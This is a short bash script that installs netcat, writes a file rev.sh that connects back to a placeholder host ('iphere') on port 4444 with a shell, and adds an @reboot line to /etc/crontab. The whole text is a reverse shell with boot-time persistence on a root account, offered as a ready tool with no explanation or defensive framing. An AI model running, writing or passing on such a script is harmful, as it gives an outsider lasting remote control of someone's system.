#!/bin/bash
apt install netcat
cd /root
echo "#!/bin/bash" > rev.sh
echo "nc iphere 4444 -e /bin/bash" >> rev.sh
echo "@reboot /root/rev.sh &" >> /etc/crontab
./rev.sh